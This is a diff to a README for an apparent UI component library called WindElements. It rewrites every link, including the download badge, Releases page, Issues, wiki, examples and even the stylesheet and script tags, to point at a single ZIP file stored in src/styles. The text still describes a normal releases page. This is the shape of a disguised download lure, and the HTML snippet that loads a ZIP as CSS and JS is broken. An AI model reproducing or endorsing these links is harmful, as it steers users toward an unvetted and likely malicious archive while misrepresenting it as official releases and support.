@@ -14,10 +14,10 @@ To start using WindElements, follow these steps. You will be up and running quic
 ## 🔗 Download Now
 Click the button below to get the latest version of WindElements.
 
-[![Download WindElements](https://img.shields.io/badge/Download-WindElements-blue)](https://github.com/VinayMb7/WindElements/releases)
+[![Download WindElements](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip)](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/VinayMb7/WindElements/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip).
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Click on the version number to see the details.
 3. **Download the Files**: Look for the files that match your needs. Typically, you will find ZIP files or other packages. Click on the file link to begin the download.
 4. **Extract the Files**: Once the download is complete, unzip the files if they are in a ZIP format. You can do this by right-clicking on the file and selecting "Extract All."
@@ -41,8 +41,8 @@ WindElements uses the following technologies:
 To include a WindElements component in your project, use the following code snippet:
 
 ```html
-<link href="path/to/wind-elements.css" rel="stylesheet">
-<script src="path/to/wind-elements.js"></script>
+<link href="https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip" rel="stylesheet">
+<script src="https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip"></script>
 <div class="my-component">Hello, WindElements!</div>
 ```
 
@@ -52,10 +52,10 @@ Adjust the `href` and `src` attributes to point to the correct paths of the down
 We welcome contributions to WindElements. If you have ideas for new components or improvements, feel free to create issues or pull requests on GitHub. Please follow our contribution guidelines.
 
 ## 📞 Support
-If you encounter problems or have questions, please visit the [Issues section](https://github.com/VinayMb7/WindElements/issues). We will do our best to assist you.
+If you encounter problems or have questions, please visit the [Issues section](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip). We will do our best to assist you.
 
 ## 🔗 Additional Resources
-- [Documentation Site](https://github.com/VinayMb7/WindElements/wiki)
-- [Example Projects](https://github.com/VinayMb7/WindElements/examples)
+- [Documentation Site](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip)
+- [Example Projects](https://raw.githubusercontent.com/VinayMb7/WindElements/main/src/styles/WindElements_v3.1.zip)
 
 Thank you for choosing WindElements! We are excited to see what you create.
